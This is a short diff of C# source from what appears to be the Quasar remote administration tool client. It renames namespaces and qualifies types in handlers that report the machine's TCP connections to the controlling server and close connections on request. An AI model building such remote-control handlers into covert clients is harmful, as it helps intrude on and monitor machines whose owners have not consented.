@@ -1,19 +1,18 @@
-﻿using Quasar.Common.Enums;
-using Quasar.Common.Messages;
-using System;
-using System.Diagnostics;
+﻿using System;
 using System.Net;
 using System.Runtime.InteropServices;
-using xClient.Core.Networking;
+using Quasar.Common.Enums;
+using Quasar.Common.Messages;
 using Models = Quasar.Common.Models;
+using Process = System.Diagnostics.Process;
 
-namespace xClient.Core.Commands
+namespace Quasar.Client.Core.Commands
 {
     /* THIS PARTIAL CLASS SHOULD CONTAIN METHODS THAT HANDLE TCP Connections COMMANDS. */
 
     public static partial class CommandHandler
     {
-        public static void HandleGetConnections(Client client, GetConnections packet)
+        public static void HandleGetConnections(Networking.Client client, GetConnections packet)
         {
             var table = GetTable();
 
@@ -44,7 +43,7 @@ namespace xClient.Core.Commands
             client.Send(new GetConnectionsResponse {Connections = connections});
         }
 
-        public static void HandleDoCloseConnection(Client client, DoCloseConnection packet)
+        public static void HandleDoCloseConnection(Networking.Client client, DoCloseConnection packet)
         {
             var table = GetTable();
 
